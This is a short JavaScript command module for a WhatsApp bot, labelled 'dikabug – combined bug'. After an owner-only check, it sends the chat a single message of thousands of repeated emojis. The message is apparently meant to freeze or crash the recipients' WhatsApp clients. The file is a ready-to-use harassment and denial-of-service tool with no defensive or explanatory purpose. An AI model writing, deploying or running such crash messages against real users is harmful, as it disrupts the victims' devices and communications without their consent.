// dikabug – combined bug
exports.execute = async (sock, msg, args) => {
    const from = msg.key.remoteJid;
    const sender = msg.key.participant || from;
    const owner = global.ownerNumber + '@s.whatsapp.net';
    if (sender !== owner) return sock.sendMessage(from, { text: '❌ Owner only.' });

    const bug = '⚠️'.repeat(3000) + '\n' + '🔴'.repeat(3000);
    await sock.sendMessage(from, { text: bug });
};
